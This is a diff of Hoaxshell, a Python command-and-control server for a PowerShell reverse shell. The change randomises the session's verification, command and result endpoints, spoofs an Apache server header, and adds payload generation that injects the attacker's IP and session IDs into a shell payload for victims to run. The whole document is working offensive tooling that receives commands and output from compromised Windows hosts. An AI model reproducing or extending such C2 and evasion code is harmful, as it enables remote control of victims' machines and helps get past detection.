@@ -10,6 +10,7 @@ from datetime import date, datetime
 from IPython.display import display
 from threading import Thread, Event
 from time import sleep
+from ipaddress import ip_address
 
 filterwarnings("ignore", category = DeprecationWarning) 
 
@@ -32,6 +33,7 @@ INFO = f'{MAIN}Info{END}'
 WARN = f'{ORANGE}Warning{END}'
 IMPORTANT = WARN = f'{ORANGE}Important{END}'
 FAILED = f'{RED}Fail{END}'
+DEBUG = f'{ORANGE}Debug{END}'
 
 # -------------- Arguments & Usage -------------- #
 parser = argparse.ArgumentParser()
@@ -48,50 +50,60 @@ parser.add_argument("-q", "--quiet", action="store_true", help = "Do not print t
 
 args = parser.parse_args()
 
-# ~ if args.url:
-	# ~ try:
-		# ~ Hoaxshell_server_url = args.url
-		
-		# ~ if re.search("http://", Hoaxshell_server_url):
-			# ~ exit(f'\n[{FAILED}] - {BOLD}Hoaxshell requires https to run. The attack will most likely fail otherwise.{END}\n')
-		
-		# ~ tmp = Hoaxshell_server_url.split('/')
-		# ~ Hoaxshell_server_url = '/'.join(tmp[:3])
-		
-		# ~ if not validate_url(Hoaxshell_server_url):
-			# ~ exit(f'\n[{FAILED}] - {BOLD}Invalid server base url.{END}\n')
-		
-	# ~ except IndexError:
-		# ~ parser.print_usage()
-		# ~ sys.exit(1)
+def exit_with_msg(msg):
+	print(f"[{DEBUG}] {msg}")
+	sys.exit(0)
+
+# Check if provided ip is valid
+try:
+	ip_object = ip_address(args.server_ip)
+	
+except ValueError:
+	exit_with_msg('IP address is not valid.')
+
+# Check if port is valid.
+if args.port:
+	if args.port < 1 or args.port > 65535:
+		exit_with_msg('Port number is not valid.')
 
 ssl_support = True if args.certfile and args.keyfile else False
 
 # -------------- General Functions -------------- #                                           
 def print_banner():
-	txt_color = 46
+
 	padding = '  '
-	l = f'\033[38;5;{txt_color}m'
-	e = '\033[38;5;255m'
 	 
-	banner = [
-		f'{padding}   {e}██{l}╗{e}  ██{l}╗{e} ██████{l}╗{e}  █████{l}╗{e} ██{l}╗{e}  ██{l}╗{e}███████{l}╗{e}██{l}╗{e}  ██{l}╗{e}███████{l}╗{e}██{l}╗{e}     ██{l}╗{e}',
-		f'{padding}   ██{l}║{e}  ██{l}║{e}██{l}╔═══{e}██{l}╗{e}██{l}╔══{e}██{l}╗╚{e}██{l}╗{e}██{l}╔╝{e}██{l}╔════╝{e}██{l}║{e}  ██{l}║{e}██{l}╔════╝{e}██{l}║{e}     ██{l}║{e}',
-		f'{padding}   ███████{l}║{e}██{l}║{e}   ██{l}║{e}███████{l}║ ╚{e}███{l}╔╝ {e}███████{l}╗{e}███████{l}║{e}█████{l}╗{e}  ██{l}║{e}     ██{l}║{e}',
-		f'{padding}   ██{l}╔══{e}██{l}║{e}██{l}║{e}   ██{l}║{e}██{l}╔══{e}██{l}║{e} ██{l}╔{e}██{l}╗ ╚════{e}██{l}║{e}██{l}╔══{e}██{l}║{e}██{l}╔══╝{e}  ██{l}║{e}     ██{l}║{e}',
-		f'{padding}   ██{l}║  {e}██{l}║╚{e}██████{l}╔╝{e}██{l}║{e}  ██{l}║{e}██{l}╔╝{e} ██{l}╗{e}███████{l}║{e}██{l}║{e}  ██{l}║{e}███████{l}╗{e}███████{l}╗{e}███████{l}╗{e}',
-		f'{padding}   {l}╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝{END}'
-	]
+	banner = [list('╦ ╦┌─┐┌─┐─┐ ┬┌─┐┬ ┬┌─┐┬  ┬  '), list('╠═╣│ │├─┤┌┴┬┘└─┐├─┤├┤ │  │  '), list('╩ ╩└─┘┴ ┴┴ └─└─┘┴ ┴└─┘┴─┘┴─┘')]
+#	banner = list(banner)
+	skip = []
+	print('\n')
+	init_color = 34
+	txt_color = init_color
+	r = 28
+	c = 0
+	char_count = 0
+	for char_list in banner:
+		for char in char_list:
+			color = f'\033[38;5;{txt_color}m'
+			print(f'{color}{char}', end='')
+			#if char != ' ' and char_count not in skip:		
+			if char_count == 27:
+				init_color += 1
+				txt_color = init_color
+				char_count = 0			
+			else:
+				txt_color += 36
+			#else:
+				#skip.append(char_count)
+			
+			char_count += 1	
+			c += 1		
+			if c == r: 
+				print('\r')
+				c = 0
+		
 
-	
-	print('\r')
-	
-	for line in banner:
-		l = f'\033[38;5;{txt_color}m'
-		print(f'{line}')
-		txt_color += 1
-
-	print(f'{padding}\t\t\t\t\t\t         Created by t3l3machus\n')
+	print(f'{END}{padding}     Created by t3l3machus\n')
 
 
 
@@ -125,7 +137,7 @@ def checkPulse(stop_event):
 				stop_event.set()
 		
 		sleep(5)
-		
+
 
 
 def chill():
@@ -138,7 +150,6 @@ verbose = True if args.verbose else False
 quiet = True if args.quiet else False
 frequency = str(args.frequency) if args.frequency else '1000'
 stop_event = Event()
-
 
 def rst_prompt(force_rst = False, prompt = prompt, prefix = '\r'):
 	
@@ -156,7 +167,10 @@ class Hoaxshell(BaseHTTPRequestHandler):
 	command_pool = []
 	execution_verified = False
 	last_received = ''
-	SESSIONID = str(uuid.uuid4())
+	verify = str(uuid.uuid4()).replace("-", "")[0:8]
+	get_cmd = str(uuid.uuid4()).replace("-", "")[0:8]
+	post_res = str(uuid.uuid4()).replace("-", "")[0:8]	
+	SESSIONID = '-'.join([verify, get_cmd, post_res])
 	
 		
 	def do_GET(self):
@@ -166,16 +180,20 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 		if args.grab and not Hoaxshell.restored:			
 			session_id = self.headers.get('X-hoax-id')
-			if is_valid_uuid(session_id):
+			if len(session_id) == 26:
+				h = session_id.split('-')
+				Hoaxshell.verify = h[0]
+				Hoaxshell.get_cmd = h[1]
+				Hoaxshell.post_res = h[2]
 				Hoaxshell.SESSIONID = session_id
 				Hoaxshell.restored = True
-				Hoaxshell.execution_verified = True
+				Hoaxshell.execution_verified = True				
 				session_check = Thread(target = checkPulse, args = (stop_event,))
 				session_check.daemon = True
 				session_check.start()				
 				
 			print(f'\r[{GREEN}Shell{END}] {BOLD}Session restored!{END}')
-			rst_promt_required = True
+			rst_prompt(force_rst = True)
 				
 		self.server_version = "Apache/2.4.1"
 		self.sys_version = ""
@@ -183,7 +201,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 		legit = True if session_id == Hoaxshell.SESSIONID else False
 
 		# Verify execution
-		if self.path == f'/4db6390f840c' and legit:
+		if self.path == f'/{Hoaxshell.verify}' and legit:
 			
 			self.send_response(200)
 			self.send_header('Content-type', 'text/javascript; charset=UTF-8')
@@ -195,11 +213,12 @@ class Hoaxshell(BaseHTTPRequestHandler):
 			session_check.daemon = True
 			session_check.start()	
 			print(f'\r[{GREEN}Shell{END}] {BOLD}Execution verified!{END}')
-			rst_promt_required = True
+			rst_prompt(force_rst = True)
+			
 
 
 		# Grab cmd
-		if self.path == f'/c5233a465a7d' and legit and Hoaxshell.execution_verified:
+		if self.path == f'/{Hoaxshell.get_cmd}' and legit and Hoaxshell.execution_verified:
 						
 			self.send_response(200)
 			self.send_header('Content-type', 'text/javascript; charset=UTF-8')
@@ -221,9 +240,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 			self.end_headers()
 			self.wfile.write(b'Move on mate.')
 			pass				
-			
-		rst_prompt()
-
+					
 		
 		
 	def do_POST(self):
@@ -236,7 +253,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 		legit = True if session_id == Hoaxshell.SESSIONID else False				
 					
 		# cmd results
-		if self.path == '/7f47fd7ae404' and legit and Hoaxshell.execution_verified:
+		if self.path == f'/{Hoaxshell.post_res}' and legit and Hoaxshell.execution_verified:
 
 			self.send_response(200)
 			self.send_header('Access-Control-Allow-Origin', '*')
@@ -317,12 +334,12 @@ def main():
 		
 		# Prepare payload
 		if not args.grab:
-			print(f'[{INFO}] {BOLD}Generating payload...{END}\n')
+			print(f'[{INFO}] {BOLD}Generating payload...{END}')
 			source = open(f'./https_payload.ps1', 'r') if  ssl_support else open(f'./http_payload.ps1', 'r')
 			payload = source.read()
 			source.close()
 			freq = args.frequency if args.frequency else 1
-			payload = payload.replace('*SERVERIP*', f'{args.server_ip}:{server_port}').replace('*SESSIONID*', Hoaxshell.SESSIONID).replace('*FREQ*', str(freq))	
+			payload = payload.replace('*SERVERIP*', f'{args.server_ip}:{server_port}').replace('*SESSIONID*', Hoaxshell.SESSIONID).replace('*FREQ*', str(freq)).replace('*VERIFY*', Hoaxshell.verify).replace('*GETCMD*', Hoaxshell.get_cmd).replace('*POSTRES*', Hoaxshell.post_res)
 			encodePayload(payload) if not args.raw_payload else print(f'{PLOAD}{payload}{END}')
 
 			print(f'[{INFO}] {BOLD}Type "help" to get a list of the available prompt commands.{END}')
